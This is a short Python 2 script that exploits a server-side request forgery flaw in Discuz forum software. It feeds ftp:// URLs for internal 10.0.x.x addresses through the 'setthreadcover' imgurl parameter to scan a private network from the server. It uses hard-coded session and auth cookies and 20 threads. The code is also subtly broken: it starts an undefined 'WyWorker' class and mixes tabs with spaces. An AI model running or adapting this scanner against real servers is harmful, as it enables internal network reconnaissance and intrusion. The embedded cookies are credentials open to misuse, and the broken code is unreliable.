#!/usr/bin/env python
# encoding: utf-8
import requests
import time
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import threading
import Queue
threads_count = 20
scheme = 'ftp'
port = '65533'
port1 = '6379'
ip_block = '10.0'
class Worker(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue = queue
    def run(self):
        while True:
            if self.queue.empty():
                break
            try:
		proxies = {"http":"127.0.0.1:8085"}
		(scheme, ip, port) = self.queue.get_nowait()
		payload = '{scheme}://{ip}:{port}'.format(scheme=scheme, ip=ip, port=port)
		url = "http://127.0.0.1/dz/forum.php?mod=ajax&action=setthreadcover&inajax=1&fid=2&wysiwyg=1&imgurl={payload}&tid=2&pid=1".format(payload=payload)
		header = {"Cookie":"kLeF_2132_lastvisit=1502698831; kLeF_2132_nofavfid=1; kLeF_2132_visitedfid=2; kLeF_2132_lip=127.0.0.1%2C1502711622; kLeF_2132_ulastactivity=4cb4k%2FLxwVR5sTKotZOZD8cPdUdtjMQ0wGLGDdyDOcRfkDdZ2xmt; _ga=GA1.1.1030029695.1502711342; _gid=GA1.1.689776330.1502711342; kLeF_2132_st_t=1%7C1502775302%7C2eeaa2d6a40a44a6f58678e7a0b6a266; kLeF_2132_forum_lastvisit=D_2_1502775302; kLeF_2132_st_p=1%7C1502775308%7Cb344ab0769ca2f8a4bc8e5257417058a; kLeF_2132_viewid=tid_2; kLeF_2132_sid=lZ0w0Q; kLeF_2132_smile=1D1; kLeF_2132_seccode=2.489b501943be3f9c28; kLeF_2132_lastact=1502778393%09forum.php%09ajax; kLeF_2132_connect_is_bind=0; session=2b0f72ee-13bf-4247-b167-ce462b263381; kLeF_2132_auth=92302gYfLsNuPqkEvh6Um4FD0HI8K2RSgmRgBrlJatTB%2BLqShIttK%2FEW7%2BnCNkf7OSX6MLOC2Ihgqqgchhae; kLeF_2132_saltkey=u1eLNQD1"}
		content = requests.get(url,headers=header, timeout=6,proxies=proxies).content
		print ip, "ip exists"
            except requests.exceptions.ReadTimeout:
                pass
            except requests.exceptions.ConnectTimeout:
                pass
            except Exception, e:
		print e
                break
queue = Queue.Queue()
for c in xrange(1,3):
    for d in xrange(1,255):    
        ip = '{0}.{1}.{2}'.format(ip_block,c,d)

        queue.put((scheme,ip,port))
threads = []
for i in xrange(threads_count):
    threads.append(WyWorker(queue))
for t in threads:
    t.start()
for t in threads:
    t.join()
